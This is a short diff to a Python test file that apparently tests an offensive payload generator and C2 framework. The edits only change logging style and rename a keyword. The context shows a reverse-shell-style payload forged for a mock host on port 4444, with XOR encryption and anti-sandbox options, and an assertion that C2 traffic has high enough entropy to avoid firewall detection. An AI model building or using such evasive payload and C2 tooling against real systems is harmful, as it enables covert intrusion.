@@ -82,7 +82,7 @@ class TestWarGameSimulation(unittest.TestCase):
 
         def side_effect(command, **kwargs):
             # Simulate successful execution of our generated payload
-            logger.info(f"[SIM] Executing Command: {command[:50]}...")
+            logger.info("[SIM] Executing Command: %s...", command[:50])
             return ExecutionResult(
                 command=command,
                 status=ExecutionStatus.SUCCESS,
@@ -142,7 +142,7 @@ class TestWarGameSimulation(unittest.TestCase):
         raw_payload = self.foundry.forge(
             lhost="192.168.1.5",  # Our mock IP
             lport=4444,
-            format=PayloadFormat.PYTHON,
+            output_format=PayloadFormat.PYTHON,
             encryption=EncryptionMethod.XOR_MULTI,  # High security (Standard Lib)
             anti_sandbox=True,
         )
@@ -205,7 +205,7 @@ class TestWarGameSimulation(unittest.TestCase):
         raw_bytes = base64.b64decode(encrypted_beacon)
         entropy = get_entropy(raw_bytes)
 
-        logger.info(f"[+] C2 Traffic Entropy: {entropy:.2f} bits/byte")
+        logger.info("[+] C2 Traffic Entropy: %.2f bits/byte", entropy)
         assert entropy > 6.0, (
             "Mission Failed: C2 traffic detected by Firewall (Low Entropy)!"
         )
